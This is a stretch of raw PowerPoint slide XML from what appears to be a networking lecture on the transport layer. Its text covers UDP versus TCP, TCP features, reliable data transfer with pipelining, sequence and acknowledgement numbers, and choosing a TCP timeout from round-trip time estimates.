                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5597280" y="3412800"/>
                  <a:ext cx="78840" cy="3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57" name="CustomShape 326"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5603040" y="3426480"/>
                  <a:ext cx="27720" cy="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58" name="CustomShape 327"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5601960" y="3431880"/>
                  <a:ext cx="2088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59" name="CustomShape 328"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5626080" y="3433680"/>
                  <a:ext cx="27720" cy="11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60" name="CustomShape 329"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5625360" y="3439080"/>
                  <a:ext cx="2088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561" name="CustomShape 330"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5736240" y="3417480"/>
                <a:ext cx="9900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62" name="CustomShape 331"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5482440" y="3423960"/>
                <a:ext cx="2538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63" name="CustomShape 332"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5482800" y="3410640"/>
                <a:ext cx="25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64" name="CustomShape 333"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5482800" y="3349800"/>
                <a:ext cx="1177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65" name="CustomShape 334"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5490720" y="3413880"/>
                <a:ext cx="24084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66" name="CustomShape 335"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipV="1">
                <a:off x="5731560" y="3408120"/>
                <a:ext cx="97920" cy="7308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67" name="Group 336"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5840640" y="3278160"/>
              <a:ext cx="414000" cy="372600"/>
              <a:chOff x="5840640" y="3278160"/>
              <a:chExt cx="414000" cy="372600"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="568" name="Picture 1250" descr="desktop_computer_stylized_medium"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId6"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="5840640" y="3278160"/>
                <a:ext cx="414000" cy="3726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69" name="CustomShape 337"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="6017040" y="3313800"/>
                <a:ext cx="195120" cy="17064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70" name="Group 338"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="7207200" y="5478480"/>
              <a:ext cx="474480" cy="413280"/>
              <a:chOff x="7207200" y="5478480"/>
              <a:chExt cx="474480" cy="413280"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="571" name="Picture 1253" descr="antenna_stylized"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId15"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="7207200" y="5478480"/>
                <a:ext cx="470520" cy="22356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572" name="Picture 1254" descr="laptop_keyboard"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId16"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm rot="99600" flipH="1">
                <a:off x="7230600" y="5726880"/>
                <a:ext cx="387360" cy="15912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73" name="CustomShape 339"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7358760" y="5572080"/>
                <a:ext cx="311760" cy="207720"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst/>
                <a:ahLst/>
                <a:cxnLst/>
                <a:rect l="l" t="t" r="r" b="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pic>
            <p:nvPicPr>
              <p:cNvPr id="574" name="Picture 1256" descr="screen"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId17"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="7373880" y="5577480"/>
                <a:ext cx="283320" cy="1890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75" name="CustomShape 340"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7415640" y="5565960"/>
                <a:ext cx="264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76" name="CustomShape 341"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7355880" y="5565600"/>
                <a:ext cx="7308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77" name="CustomShape 342"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7598880" y="5594400"/>
                <a:ext cx="78840" cy="185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78" name="CustomShape 343"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7355160" y="5718600"/>
                <a:ext cx="28980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CC"/>
                  </a:gs>
                  <a:gs pos="100000">
                    <a:srgbClr val="FFFFFF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79" name="CustomShape 344"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7607880" y="5596200"/>
                <a:ext cx="73800" cy="186480"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst/>
                <a:ahLst/>
                <a:cxnLst/>
                <a:rect l="l" t="t" r="r" b="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80" name="CustomShape 345"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7355160" y="5727240"/>
                <a:ext cx="257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581" name="Group 346"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="7350840" y="5793480"/>
                <a:ext cx="87120" cy="36360"/>
                <a:chOff x="7350840" y="5793480"/>
                <a:chExt cx="87120" cy="36360"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="582" name="CustomShape 347"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7350840" y="5793480"/>
                  <a:ext cx="87120" cy="3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3" name="CustomShape 348"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7352640" y="5794200"/>
                  <a:ext cx="84240" cy="3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4" name="CustomShape 349"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7358760" y="5807880"/>
                  <a:ext cx="29520" cy="1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5" name="CustomShape 350"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7358040" y="5812920"/>
                  <a:ext cx="2232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6" name="CustomShape 351"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7383600" y="5815080"/>
                  <a:ext cx="29520" cy="11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587" name="CustomShape 352"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7382520" y="5820480"/>
                  <a:ext cx="22320" cy="6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588" name="CustomShape 353"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7500960" y="5798880"/>
                <a:ext cx="105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89" name="CustomShape 354"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7230240" y="5805360"/>
                <a:ext cx="27108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90" name="CustomShape 355"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7230240" y="5791680"/>
                <a:ext cx="25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91" name="CustomShape 356"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7230600" y="5730840"/>
                <a:ext cx="12564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92" name="CustomShape 357"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7238880" y="5794920"/>
                <a:ext cx="25704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93" name="CustomShape 358"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipV="1">
                <a:off x="7496280" y="5789160"/>
                <a:ext cx="104760" cy="73080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pic>
        <p:nvPicPr>
          <p:cNvPr id="594" name="Picture 864" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId21"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="404640" y="1100160"/>
            <a:ext cx="6144840" cy="142560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="595" name="TextShape 359"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304920" y="358920"/>
            <a:ext cx="838152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Transport services and protocols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Shape 360"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="438120" y="1511280"/>
            <a:ext cx="4086000" cy="39938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provide</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="1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800" b="0" i="1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>logical communication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between app processes running on different hosts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transport protocols run in end systems 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sending side: breaks app messages into </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>segments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, passes to  network layer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receiving side: reassembles segments into messages, passes to app layer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57240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Two transport protocols on Internet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UDP: fast(er) but unreliable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TCP: reliable data transfer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7" name="Group 361"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7856640" y="4454640"/>
            <a:ext cx="1056600" cy="1003320"/>
            <a:chOff x="7856640" y="4454640"/>
            <a:chExt cx="1056600" cy="1003320"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="598" name="Group 362"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="8099280" y="4454640"/>
              <a:ext cx="813960" cy="1003320"/>
              <a:chOff x="8099280" y="4454640"/>
              <a:chExt cx="813960" cy="1003320"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="599" name="CustomShape 363"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8197920" y="4459320"/>
                <a:ext cx="676080" cy="77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00" name="CustomShape 364"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8164440" y="4483080"/>
                <a:ext cx="690120" cy="799920"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="bg1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01" name="CustomShape 365"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8169120" y="4659480"/>
                <a:ext cx="676080" cy="171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02" name="CustomShape 366"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8099280" y="4454640"/>
                <a:ext cx="813960" cy="1003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application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Tahoma"/>
                    <a:ea typeface="ＭＳ Ｐゴシック"/>
                  </a:rPr>
                  <a:t>transport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network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data link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physical</a:t>
                </a:r>
                <a:endParaRPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
                  <a:latin typeface="Calibri"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="603" name="Line 367"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8164440" y="4825800"/>
                <a:ext cx="690480" cy="468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04" name="Line 368"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8173800" y="4964040"/>
                <a:ext cx="690480" cy="468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05" name="Line 369"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8173800" y="5101920"/>
                <a:ext cx="690480" cy="504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606" name="CustomShape 370"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7856640" y="4468680"/>
              <a:ext cx="304560" cy="942480"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t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0"/>
            </a:gradFill>
            <a:ln w="9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07" name="Group 371"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5887440" y="1671120"/>
            <a:ext cx="2785320" cy="3137400"/>
            <a:chOff x="5887440" y="1671120"/>
            <a:chExt cx="2785320" cy="3137400"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="608" name="CustomShape 372"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="2937600">
              <a:off x="5751000" y="3100320"/>
              <a:ext cx="3047760" cy="2757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9" name="CustomShape 373"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="2937600">
              <a:off x="5932800" y="3098520"/>
              <a:ext cx="2735280" cy="333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FFFFFF"/>
                  </a:solidFill>
                  <a:latin typeface="Tahoma"/>
                  <a:ea typeface="ＭＳ Ｐゴシック"/>
                </a:rPr>
                <a:t>logical end-end transport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610" name="CustomShape 374"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="2937600">
              <a:off x="5968080" y="1767960"/>
              <a:ext cx="447480" cy="418680"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t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1" name="CustomShape 375"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="2937600" flipH="1">
              <a:off x="8143920" y="4293000"/>
              <a:ext cx="447480" cy="418680"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b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612" name="Group 376"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5462640" y="1297080"/>
            <a:ext cx="1056960" cy="1003320"/>
            <a:chOff x="5462640" y="1297080"/>
            <a:chExt cx="1056960" cy="1003320"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="613" name="Group 377"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5705640" y="1297080"/>
              <a:ext cx="813960" cy="1003320"/>
              <a:chOff x="5705640" y="1297080"/>
              <a:chExt cx="813960" cy="1003320"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="614" name="CustomShape 378"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5803920" y="1301760"/>
                <a:ext cx="676080" cy="77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15" name="CustomShape 379"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5770440" y="1325520"/>
                <a:ext cx="690120" cy="799560"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:ln w="126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16" name="CustomShape 380"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5775480" y="1501920"/>
                <a:ext cx="676080" cy="171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17" name="CustomShape 381"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5705640" y="1297080"/>
                <a:ext cx="813960" cy="1003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application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FFFFFF"/>
                    </a:solidFill>
                    <a:latin typeface="Tahoma"/>
                    <a:ea typeface="ＭＳ Ｐゴシック"/>
                  </a:rPr>
                  <a:t>transport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network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data link</a:t>
                </a:r>
                <a:endParaRPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
                  <a:latin typeface="Calibri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en-US" sz="10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physical</a:t>
                </a:r>
                <a:endParaRPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
                  <a:latin typeface="Calibri"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="618" name="Line 382"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5770440" y="1668240"/>
                <a:ext cx="690480" cy="468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19" name="Line 383"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5779800" y="1806480"/>
                <a:ext cx="690840" cy="468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20" name="Line 384"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5779800" y="1944360"/>
                <a:ext cx="690840" cy="5040"/>
              </a:xfrm>
              <a:prstGeom prst="line">
                <a:avLst/>
              </a:prstGeom>
              <a:ln w="1260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621" name="CustomShape 385"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5462640" y="1311120"/>
              <a:ext cx="304560" cy="942480"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b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0"/>
            </a:gradFill>
            <a:ln w="9360">
              <a:solidFill>
                <a:srgbClr val="FF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22" name="CustomShape 386"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7238880" y="623736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extShape 1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4AE54A0-A7B6-4C7B-93BC-A739BDB7B93D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16</a:t>
            </a:fld>
            <a:endParaRPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="624" name="TextShape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2422440" y="252360"/>
            <a:ext cx="6283080" cy="88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TCP: Overview  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="25167A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>RFCs: 793,1122,1323, 2018, 2581</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL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Shape 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4809960" y="1422360"/>
            <a:ext cx="3895200" cy="4647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pipelined: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TCP congestion and flow control set window size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full duplex data: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bi-directional data flow in same connection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Shape 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="571680" y="1413000"/>
            <a:ext cx="3981240" cy="4647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point-to-point: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one sender, one receiver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connection-oriented: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handshaking (exchange of control msgs) inits sender, receiver state before data exchange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reliable, in-order </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>byte stream: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no “message boundaries”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flow control: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sender will not overwhelm receiver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congestion control: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sender will not overwhelm network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7" name="Picture 6" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2422440" y="966960"/>
            <a:ext cx="6257520" cy="131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Reliable data transfer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Shape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="430200" y="1527120"/>
            <a:ext cx="822924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How can we accomplish reliable data transfer?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For each packet of data sent, a confirmation from the receiver is expected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Otherwise, the data is sent again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CC0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>pipelining: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sender allows multiple, “in-flight”, yet-to-be-acknowledged pkts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need to keep track of sequence numbers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buffering at sender and/or receiver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762529B-7C1D-4F62-862A-555AB63A2934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17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631" name="Picture 6" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="484200" y="1273320"/>
            <a:ext cx="3806640" cy="186840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="632" name="CustomShape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1397160" y="655020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2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633" name="Picture 5" descr="rdt_pipelined1"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1397160" y="4179960"/>
            <a:ext cx="6105240" cy="23698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cap="all" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="25167A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>TCP Seq &amp; ACK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Shape 2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E42E395-9B2A-4387-9125-15FEDF9C2C71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18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636" name="Picture 82" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="384120" y="1684440"/>
            <a:ext cx="3592080" cy="172800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="637" name="Picture 53"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1913040" y="2087640"/>
            <a:ext cx="5192280" cy="4304880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="638" name="CustomShape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391440" y="637524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4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Shape 1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nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="640" name="Picture 1029" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="473040" y="1314360"/>
            <a:ext cx="5365440" cy="161640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="641" name="TextShape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411120" y="604800"/>
            <a:ext cx="7772040" cy="920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cap="all" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="25167A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>TCP </a:t>
            </a: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round trip time, timeout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Shape 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581040" y="1436760"/>
            <a:ext cx="3715920" cy="4647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sng" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Q:</a:t>
            </a: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 how to set TCP timeout value?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longer than RTT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but RTT varies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too short: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premature timeout, unnecessary retransmissions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000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>too long: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 slow reaction to segment loss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Shape 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4646520" y="1486080"/>
            <a:ext cx="4059000" cy="4647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sng" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>Q: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how to estimate RTT?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99"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>SampleRTT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>: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measured time from segment transmission until ACK receipt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SampleRTT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will vary, want estimated RTT “smoother”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average several </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0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recent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measurements, not just current </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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SampleRTT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CustomShape 5"/>
